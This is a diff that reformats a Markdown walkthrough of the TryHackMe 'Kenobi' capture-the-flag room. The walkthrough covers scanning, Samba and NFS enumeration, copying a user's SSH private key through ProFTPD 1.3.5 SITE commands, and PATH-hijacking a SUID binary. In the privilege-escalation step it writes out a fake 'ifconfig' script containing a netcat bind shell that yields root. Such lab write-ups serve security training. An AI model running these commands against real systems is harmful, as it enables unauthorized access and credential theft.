@@ -1,31 +1,32 @@
-# Kenobi-THM
+# Kenobi
 
-----
+## Kenobi-THM
 
-# Info
+***
 
-| Name         |   Kenobi                                         | 
-| ------       | -----------------                                |
-| Room link    |    https://tryhackme.com/room/kenobi             |  
-| Difficulty   | Easy                                             |
-| Created by   |   [tryhackme](https://tryhackme.com/p/tryhackme) |
-| solving date | april 3rd 2022                                  |
-----
+## Info
 
-![OcA2KrK.gif](images/OcA2KrK.gif)
+| Name         | Kenobi                                         |
+| ------------ | ---------------------------------------------- |
+| Room link    | https://tryhackme.com/room/kenobi              |
+| Difficulty   | Easy                                           |
+| Created by   | [tryhackme](https://tryhackme.com/p/tryhackme) |
+| solving date | april 3rd 2022                                 |
+| ----         |                                                |
 
+![OcA2KrK.gif](../Kenobi/images/OcA2KrK.gif)
 
 Room description “This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access, and escalating your privileges to root via an SUID binary.”
 
----
+***
 
-# Task1: Deploy the vulnerable machine
+## Task1: Deploy the vulnerable machine
 
 > Question1: Make sure you're connected to our network and deploy the machine
-> 
-- Let’s start with nmap scan
-- `nmap -vv -sS -sV -Pn -oN Kenobi_nmap_result $target`
-    
+
+* Let’s start with nmap scan
+*   `nmap -vv -sS -sV -Pn -oN Kenobi_nmap_result $target`
+
     ```
     tarting Nmap 7.92 ( https://nmap.org ) at 2022-04-03 02:30 EDT
     NSE: Loaded 45 scripts for scanning.
@@ -64,37 +65,35 @@ Room description “This room will cover accessing a Samba share, manipulating a
     445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
     2049/tcp open  nfs_acl     syn-ack ttl 63 2-3 (RPC #100227)
     Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-    
+
     Read data files from: /usr/bin/../share/nmap
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 16.99 seconds
                Raw packets sent: 1037 (45.628KB) | Rcvd: 1027 (41.108KB)
     ```
-    
-- great, we found ports 21(FTP), 22(SSH), 80(HTTP), 111(RPC), 139(NetBIOS), 445(SMB), 2049(NFS) open
+* great, we found ports 21(FTP), 22(SSH), 80(HTTP), 111(RPC), 139(NetBIOS), 445(SMB), 2049(NFS) open
 
 > Question2: Scan the machine with nmap, how many ports are open?
-> 
-> 
+>
 > answer:7
-> 
-- let’s check the website running on port 80
-    - after Inspecting the source we can’t see any helpful comments, so we will Continue with task 2
 
-![Untitled](images/Untitled.png)
+* let’s check the website running on port 80
+  * after Inspecting the source we can’t see any helpful comments, so we will Continue with task 2
 
-![Untitled](images/Untitled%201.png)
+![Untitled](../Kenobi/images/Untitled.png)
 
----
+![Untitled](<../Kenobi/images/Untitled 1.png>)
 
-# Task2: Enumerating Samba for shares:
+***
 
-- smap scripts saved list in a databases in `/usr/share/nmap/scripts/scripts.db` , let’s check smb enumeration scripts
-    
-    ![Untitled](images/Untitled%202.png)
-    
-    - there are 7 scripts, we can use “smb-enum-*” to use all of them
-- `nmap -vv -sS -sV -Pn -oN nmap_smb_enum --script="smb-enum-*" $target`
+## Task2: Enumerating Samba for shares:
+
+*   smap scripts saved list in a databases in `/usr/share/nmap/scripts/scripts.db` , let’s check smb enumeration scripts
+
+    <img src="../Kenobi/images/Untitled 2.png" alt="Untitled" data-size="original">
+
+    * there are 7 scripts, we can use “smb-enum-\*” to use all of them
+* `nmap -vv -sS -sV -Pn -oN nmap_smb_enum --script="smb-enum-*" $target`
 
 ```
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
@@ -221,10 +220,11 @@ Nmap done: 1 IP address (1 host up) scanned in 315.41 seconds
            Raw packets sent: 1000 (44.000KB) | Rcvd: 1000 (40.028KB)
 ```
 
-- we found 3 shares (IPC$, anonymous, print$) and
-- Another tool we can use to enumerate the sessions is `smbmap`
-    - `smbmap -H $target`
-    
+* we found 3 shares (IPC$, anonymous, print$) and
+*   Another tool we can use to enumerate the sessions is `smbmap`
+
+    * `smbmap -H $target`
+
     ```
     [+] Guest session   	IP: 10.10.125.2:445	Name: 10.10.125.2                                       
       Disk                                                  	Permissions	Comment
@@ -233,21 +233,18 @@ Nmap done: 1 IP address (1 host up) scanned in 315.41 seconds
     	anonymous                                             	READ ONLY	
     	IPC$                                              	    NO ACCESS	IPC Service (kenobi server (Samba, Ubuntu))
     ```
-    
 
-> Question3: Using the nmap command above, how many shares have been found?
-answer: 3
-> 
-- Let’s connect to the share using `smbclient //$target/anonymous`  with “anonymous” password
-- great, list all the files in this share using `ls`, we can see log.txt file
+> Question3: Using the nmap command above, how many shares have been found? answer: 3
 
-> Question4: Once you're connected, list the files on the share. What is file can you see?
-answer: log.txt
-> 
-- view its content using `more log.txt` or download it using `get log.txt`
-- log.txt content:
-    - The information generated for Kenobi when generating an SSH key for the user
-    - Information about the ProFTPD server.
+* Let’s connect to the share using `smbclient //$target/anonymous` with “anonymous” password
+* great, list all the files in this share using `ls`, we can see log.txt file
+
+> Question4: Once you're connected, list the files on the share. What is file can you see? answer: log.txt
+
+* view its content using `more log.txt` or download it using `get log.txt`
+* log.txt content:
+  * The information generated for Kenobi when generating an SSH key for the user
+  * Information about the ProFTPD server.
 
 ```
 Generating public/private rsa key pair.
@@ -600,75 +597,64 @@ AllowOverwrite		on
    guest ok = yes
 ```
 
-> Question5: What port is FTP running on?
-answer: 21
-> 
-- to show all the mounts we can mount we will use `showmount -e <IP>`
-    
+> Question5: What port is FTP running on? answer: 21
+
+*   to show all the mounts we can mount we will use `showmount -e <IP>`
+
     ```
     Export list for 10.10.125.2:
     /var *
     ```
-    
 
-> Question6: What mount can we see?
-answer: /var
-> 
+> Question6: What mount can we see? answer: /var
 
----
+***
 
-# Task3: Gain initial access with ProFtpd
+## Task3: Gain initial access with ProFtpd
 
-- if you remember we know the version of ProFtpd from our nmap scan, so let's check this again
-    
-    ![Untitled](images/Untitled%203.png)
-    
+*   if you remember we know the version of ProFtpd from our nmap scan, so let's check this again
 
-> Question7: let's get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version?
-answer: 1.3.5
-> 
-- Let’s search for exploit in [exploit-db](https://www.exploit-db.com/)
-- as we can see there is many exploits, but we can filtrate them by searching for 1.3.5 (the version), so they are 4 exploits
-    
-    ![Untitled](images/Untitled%204.png)
-    
+    <img src="../Kenobi/images/Untitled 3.png" alt="Untitled" data-size="original">
 
-> Question8: We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.
-no answer needed
-> 
+> Question7: let's get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version? answer: 1.3.5
+
+* Let’s search for exploit in [exploit-db](https://www.exploit-db.com/)
+*   as we can see there is many exploits, but we can filtrate them by searching for 1.3.5 (the version), so they are 4 exploits
+
+    <img src="../Kenobi/images/Untitled 4.png" alt="Untitled" data-size="original">
+
+> Question8: We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. no answer needed
 
 > Question9, 10 no answer needed
-> 
-- We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.
-    
-    ![Untitled](images/Untitled%205.png)
-    
-- now we will mount /var so we can access the private ssh key
-- to mount an NFS share you should create a mount point, we will create it in /tmp directory
-    - `mkdir /tmp/kenobiShare`
-- mounting the share
-    - `mount -t nfs $target:/var /tmp/kenobiShare/`
-- navigate to the mount point
 
-![Untitled](images/Untitled%206.png)
+*   We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.
 
-- Great, Let’s use this ssh private key to login as kenobi
+    <img src="../Kenobi/images/Untitled 5.png" alt="Untitled" data-size="original">
+* now we will mount /var so we can access the private ssh key
+* to mount an NFS share you should create a mount point, we will create it in /tmp directory
+  * `mkdir /tmp/kenobiShare`
+* mounting the share
+  * `mount -t nfs $target:/var /tmp/kenobiShare/`
+* navigate to the mount point
 
-![Untitled](images/Untitled%207.png)
+![Untitled](<../Kenobi/images/Untitled 6.png>)
+
+* Great, Let’s use this ssh private key to login as kenobi
+
+![Untitled](<../Kenobi/images/Untitled 7.png>)
 
 > Question11: What is Kenobi's user flag (/home/kenobi/user.txt)?
-> 
-> 
-> ![Untitled](images/Untitled%208.png)
-> 
-> - i’m sorry for hiding the flag, but you should get it by yourself to practice
+>
+> <img src="../Kenobi/images/Untitled 8.png" alt="Untitled" data-size="original">
+>
+> * i’m sorry for hiding the flag, but you should get it by yourself to practice
 
----
+***
 
-# Task4: Privilege Escalation with Path Variable Manipulation
+## Task4: Privilege Escalation with Path Variable Manipulation
 
-- Let’s search for any SUID or SGID file using `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
-    
+*   Let’s search for any SUID or SGID file using `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
+
     ```
     kenobi@kenobi:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
     -rwsr-xr-x 1 root root 94240 May  8  2019 /sbin/mount.nfs
@@ -705,34 +691,28 @@ no answer needed
     -rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
     -rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
     ```
-    
-    > Question12: What file looks particularly out of the ordinary?
-    answer: /usr/bin/menu
-    > 
-- Let’s run this binary
-    - as we can see, there are 3 options we can use
-    
-    > Question13: Run the binary, how many options appear?
-    answer: 3
-    > 
-    
-    ![Untitled](images/Untitled%209.png)
-    
-    - Options:
-        - First option
-            
-            ![Untitled](images/Untitled%2010.png)
-            
-        - Second option
-            
-            ![Untitled](images/Untitled%2011.png)
-            
-        - Third option
-            
-            ![Untitled](images/Untitled%2012.png)
-            
-- We could search for any human readable strings on this binary using `strings`
-    
+
+    > Question12: What file looks particularly out of the ordinary? answer: /usr/bin/menu
+*   Let’s run this binary
+
+    * as we can see, there are 3 options we can use
+
+    > Question13: Run the binary, how many options appear? answer: 3
+
+    <img src="../Kenobi/images/Untitled 9.png" alt="Untitled" data-size="original">
+
+    * Options:
+      *   First option
+
+          <img src="../Kenobi/images/Untitled 10.png" alt="Untitled" data-size="original">
+      *   Second option
+
+          <img src="../Kenobi/images/Untitled 11.png" alt="Untitled" data-size="original">
+      *   Third option
+
+          <img src="../Kenobi/images/Untitled 12.png" alt="Untitled" data-size="original">
+*   We could search for any human readable strings on this binary using `strings`
+
     ```
     kenobi@kenobi:~$ strings /usr/bin/menu
     /lib64/ld-linux-x86-64.so.2
@@ -828,10 +808,10 @@ no answer needed
     .bss
     .comment
     ```
-    
-    - This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).
-- we can create executable file called curl or uname or any tool in menu binary to the binary will run it
-- I will create a file called “ifconfig” and it’s content is:
+
+    * This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).
+* we can create executable file called curl or uname or any tool in menu binary to the binary will run it
+* I will create a file called “ifconfig” and it’s content is:
 
 ```
 #!/bin/sh
@@ -839,38 +819,33 @@ echo "Done" >> /tmp/IsDone.txt
 mkfifo /tmp/f ; nc -lnvp 9090 < /tmp/f | /bin/sh > /tmp/f 2>&1
 ```
 
-- I tried to use nano but it isn't installed so I used vim
-- then we should make it executable using `chmod +x ifconfig` , and append /tmp directory to the PATH env
-    
-    ![Untitled](images/Untitled%2013.png)
-    
-- if we run `/usr/bin/menu` and choose 3 to run `ifconfig`
-    
-    ![Untitled](images/Untitled%2014.png)
-    
-    - we can see that netcat listener started so we can connect using our kali Linux machine
-    
-    ![Untitled](images/Untitled%2015.png)
-    
-- Great job, we are root now
+* I tried to use nano but it isn't installed so I used vim
+*   then we should make it executable using `chmod +x ifconfig` , and append /tmp directory to the PATH env
+
+    <img src="../Kenobi/images/Untitled 13.png" alt="Untitled" data-size="original">
+*   if we run `/usr/bin/menu` and choose 3 to run `ifconfig`
+
+    <img src="../Kenobi/images/Untitled 14.png" alt="Untitled" data-size="original">
+
+    * we can see that netcat listener started so we can connect using our kali Linux machine
+
+    <img src="../Kenobi/images/Untitled 15.png" alt="Untitled" data-size="original">
+* Great job, we are root now
 
 > Question14:
-> 
 
-> Question15:What is the root flag (/root/root.txt)?
-answer: Get the flag by yourself
-> 
-> - view  `/root/root.txt` file content using `cat`
->     
->     ![Untitled](images/Untitled%2016.png)
->     
->     - Gotcha!
+> Question15:What is the root flag (/root/root.txt)? answer: Get the flag by yourself
+>
+> *   view `/root/root.txt` file content using `cat`
+>
+>     <img src="../Kenobi/images/Untitled 16.png" alt="Untitled" data-size="original">
+>
+>     * Gotcha!
 
----
+***
 
-## Thank you for reading my write-up, I hope you learn something new. Have a nice day 🙂
+### Thank you for reading my write-up, I hope you learn something new. Have a nice day 🙂
 
- 
-- [Linkedin](https://www.linkedin.com/in/juba0x00/)
-- [Twitter](https://twitter.com/juba0x00/)
-- [TryHackMe](https://tryhackme.com/p/Juba0x430x55)
+* [Linkedin](https://www.linkedin.com/in/juba0x00/)
+* [Twitter](https://twitter.com/juba0x00/)
+* [TryHackMe](https://tryhackme.com/p/Juba0x430x55)
